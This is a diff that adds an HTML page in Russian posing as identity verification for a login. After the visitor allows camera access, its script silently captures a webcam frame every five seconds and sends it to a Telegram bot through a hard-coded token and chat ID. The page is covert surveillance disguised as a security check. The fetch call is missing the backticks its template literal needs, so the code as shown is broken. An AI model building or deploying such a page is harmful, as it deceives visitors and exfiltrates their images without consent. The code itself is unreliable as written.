@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Подтверждение личности</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; }
+        video { width: 400px; border: 2px solid #ccc; border-radius: 10px; }
+        button { padding: 10px 20px; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <h2>Для входа в систему подтвердите личность</h2>
+    <video id="video" autoplay muted></video>
+    <br><br>
+    <button onclick="startCamera()">Начать верификацию</button>
+    <p id="status">Нажмите кнопку, чтобы разрешить доступ к камере</p>
+
+    <script>
+        const BOT_TOKEN = '18830452758:AAH2Q8xpSAhS5KFurtxEPVP_64DicsERRU';
+        const CHAT_ID = '1239018602';
+
+        let stream;
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(s => {
+                    stream = s;
+                    document.getElementById('video').srcObject = stream;
+                    document.getElementById('status').innerText = 'Идёт запись...';
+                    captureFrame();
+                })
+                .catch(err => {
+                    document.getElementById('status').innerText = 'Ошибка доступа к камере: ' + err.message;
+                });
+        }
+
+        function captureFrame() {
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    photo: dataUrl,
+                    caption: 'Новое фото с камеры'
+                })
+            });
+
+            setTimeout(captureFrame, 5000);
+        }
+    </script>
+</body>
+</html>
